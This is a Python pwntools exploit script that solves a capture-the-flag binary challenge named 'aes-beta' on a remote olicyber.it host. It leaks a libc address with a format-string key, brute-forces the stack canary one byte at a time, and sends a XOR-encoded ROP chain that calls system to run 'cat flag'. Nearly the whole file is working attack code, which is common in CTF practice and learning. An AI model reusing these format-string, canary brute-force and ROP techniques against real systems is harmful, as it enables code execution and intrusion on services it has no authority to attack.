import subprocess
from time import sleep
from pwn import *

exe = ELF("./aes-beta_patched")
libc = ELF("./libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")
libc.address = 0
rop = ROP(libc)


def conn():
    if args.REMOTE:
        r = remote("aesbeta.challs.olicyber.it", 38310)

        resource = r.recvuntil(b"Result:").split(b' "')[1].split(b'"\n')[0].decode()
        stamp = subprocess.check_output(
            ["hashcash", "-mCb26", resource], text=True
        ).strip()
        r.sendline(stamp.encode())
    else:
        r = process("./aes-beta_patched")

    return r


def add_message(message):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"size: ", f"{len(message)}".encode())
    r.sendafter(b"message: ", message)
    r.recvuntil(b"PID: ")
    return r.recvline().strip().decode()


def get_message(pid):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"PID: ", pid.encode())
    result = r.recvline().strip().decode()
    if result == "Process is still running, try again later.":
        return -1, False
    result = result.replace("Status: ", "")
    status = int(result)
    ciphertext = r.recvuntil(b"Menu:").strip(b"Menu:").strip(b"Ciphertext:").strip()
    return status, ciphertext


def main():
    global r
    r = conn()

    key = b"%3$p%7$n"

    r.sendlineafter(b"key: ", key)
    r.sendlineafter(b"blocks: ", b"8")
    r.recvline()
    libc_base = libc.address = (
        int(r.recvline().strip(), 16) - libc.sym["__GI___libc_write"] - 23
    )
    print(f"Libc base: {hex(libc_base)}")

    junk = b"cat flag\x00"
    junk = junk.ljust(72, b"a")
    canary = b"%"
    while len(canary) != 8:
        print(f"Found: {canary}")

        for i in range(256):
            pid = add_message(junk + canary + int.to_bytes(i))
            status, ciphertext = get_message(pid)

            if status == 0:
                canary += int.to_bytes(i)
                break
    print(f"Canary: {hex(u64(xor(canary, key)))}")

    rop_chain = p64(libc_base + 0x00000000000B108E)  # mov rax, r9; ret;
    rop_chain += p64(libc_base + 0x000000000005A272)  # mov rdi, rax; cmp rdx, rcx; jae 0x5a25c; mov rax, r8; ret;
    rop_chain += p64(libc_base + 0x000000000050D8B)  # call do_system

    payload = junk + canary + key + xor(rop_chain, key)

    pid = add_message(payload)
    print(f"PID: {pid}")
    sleep(0.2)
    status, ciphertext = get_message(pid)

    flag = ciphertext.replace(xor(payload,key), b"")
    print(flag)

    r.interactive()

if __name__ == "__main__":
    main()
